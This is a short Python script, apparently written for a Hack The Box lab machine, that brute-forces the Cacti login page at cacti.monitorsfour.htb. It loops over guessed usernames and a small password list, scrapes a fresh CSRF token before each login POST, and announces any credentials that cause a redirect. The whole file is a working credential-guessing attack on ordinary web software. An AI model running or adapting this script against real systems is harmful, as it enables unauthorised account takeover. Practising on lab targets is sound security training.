import requests
import re
import sys

url = "http://cacti.monitorsfour.htb/cacti/index.php"

users = ["sales", "admin"]

passwords = [
    "monitorsfour", "MonitorsFour", "MonitorsFour!", 
    "password", "sales", "monitors4", "welcome", "welcome1"
]

def get_csrf_token(session):
    try:
        r = session.get(url, timeout=5)
        token_search = re.search(r'name=\'__csrf_magic\' value="(.*?)"', r.text)
        if token_search:
            return token_search.group(1)
    except:
        pass
    return None

print(f"[*] Starting IMPROVED attack against {url}...")

for user in users:
    for password in passwords:
        try:
            s = requests.Session()
            csrf_token = get_csrf_token(s)
            
            if not csrf_token:
                print("[-] Error: Could not get CSRF token. Skipping...")
                continue

            data = {
                '__csrf_magic': csrf_token,
                'action': 'login',
                'login_username': user,
                'login_password': password
            }

            r = s.post(url, data=data, allow_redirects=False)

            if r.status_code == 302:
                location = r.headers.get("Location", "")
                if "index.php" in location or "id=" in location: 
                    if "login" not in location:
                        print(f"\n[!!!]AAAAAAAAAA SUCCESS! Creds Found: {user}:{password}")
                        print(f"[+] Redirected to: {location}")
                        sys.exit()
            
        except Exception as e:
            print(f"[!] Exception: {e}")

print("\n[*] Attack finished. If no hits, we need to rethink.")